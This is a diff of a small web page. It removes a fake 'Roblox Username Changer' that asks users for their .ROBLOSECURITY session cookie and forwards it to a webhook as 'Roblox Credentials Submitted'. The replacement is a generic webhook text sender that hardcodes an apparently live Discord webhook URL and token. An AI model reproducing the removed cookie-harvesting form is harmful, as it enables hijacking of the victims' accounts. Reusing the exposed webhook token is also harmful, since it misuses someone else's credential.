@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Username Changer</title>
+    <title>Webhook Sender</title>
     <style>
         body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
         textarea { width: 100%; height: 100px; margin-bottom: 10px; }
@@ -14,40 +14,34 @@
     </style>
 </head>
 <body>
-    <h1>Roblox Username Changer</h1>
-    <p><strong>Warning:</strong> This will use your Roblox cookie to change your username.</p>
+    <h1>Webhook Sender</h1>
+    <p>Enter text to send to webhook:</p>
     
-    <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
-    <input type="text" id="newUsername" placeholder="New username">
-    <button onclick="sendToWebhook()">Submit to Webhook</button>
+    <textarea id="textInput" placeholder="Enter text here..."></textarea>
+    <button onclick="sendToWebhook()">Send to Webhook</button>
     
     <div id="status"></div>
 
     <script>
         async function sendToWebhook() {
-            const cookie = document.getElementById("cookieInput").value.trim();
-            const newUsername = document.getElementById("newUsername").value.trim();
+            const text = document.getElementById("textInput").value.trim();
             const statusEl = document.getElementById("status");
 
-            if (!cookie || !newUsername) {
-                statusEl.textContent = "Please fill all fields!";
+            if (!text) {
+                statusEl.textContent = "Please enter some text!";
                 statusEl.className = "error";
                 statusEl.style.display = "block";
                 return;
             }
 
             // Replace this with your actual webhook URL
-            const webhookUrl = "https://your-webhook-url-here.com";
+            const webhookUrl = "https://canary.discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb";
             
             const data = {
-                content: "New submission received!",
+                content: "New submission received:",
                 embeds: [{
-                    title: "Roblox Credentials Submitted",
-                    fields: [
-                        { name: "ROBLOSECURITY Cookie", value: "||" + cookie + "||" }, // Using spoiler tags
-                        { name: "Requested Username", value: newUsername }
-                    ],
-                    color: 0xff0000
+                    description: text,
+                    color: 0x3498db
                 }]
             };
 
